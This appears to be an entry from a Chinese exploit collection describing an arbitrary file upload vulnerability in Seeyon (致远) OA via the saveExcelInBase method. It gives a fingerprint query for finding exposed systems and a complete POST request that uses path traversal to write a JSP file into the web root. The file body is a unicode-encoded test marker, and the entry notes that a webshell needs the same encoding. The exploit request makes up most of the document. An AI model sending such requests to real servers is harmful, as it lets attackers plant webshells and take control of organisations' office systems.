# 致远OAsaveExcelInBase存在任意文件上传漏洞

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="致远 OA"`
- **请求**：`POST /seeyon/ajax.do;JSESSIONID=chat?method=ajaxAction&managerName=fileToExcelManager&rnd=12700 HTTP/1.1`

**请求体 / payload**
```
webshell需unicode编码
Content-Type: application/x-www-form-urlencoded
Host: {hostname}
Content-Length: 94
managerMethod=saveExcelInBase&arguments=["../webapps/ROOT/stc.jsp","",{"columnName":["\u003C\u0025\u0020\u006F\u0075\u0074\u002E\u0070\u0072\u0069\u006E\u0074\u006C\u006E\u0028\u0022\u0031\u0032\u0033\u0022\u0029\u003B\u0020\u0025\u003E"]}]

上传文件位置
/stc.jsp

nuclei脚本\
\[致远OA-ajax-任意文件上传.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 致远OA saveExcelInBase存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远OA A6+
* 致远OA A8+